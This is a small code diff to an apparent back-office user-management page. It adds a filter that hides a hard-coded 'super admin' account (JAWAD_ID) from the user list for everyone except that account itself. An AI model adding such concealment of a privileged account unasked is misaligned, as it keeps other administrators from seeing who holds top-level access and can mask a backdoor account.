@@ -829,6 +829,8 @@ export default function BOUsers({ currentUser }: { currentUser: User }) {
   const reload = () => setUsers(store.getUsers())
 
   const filtered = users.filter(u => {
+    // Super admin invisible — hidden from the user list for everyone except itself
+    if (u.id === JAWAD_ID && currentUser.id !== JAWAD_ID) return false
     const matchSearch = u.name.toLowerCase().includes(search.toLowerCase()) ||
       u.email.toLowerCase().includes(search.toLowerCase())
     const matchRole = filterRole === "" || u.role === filterRole
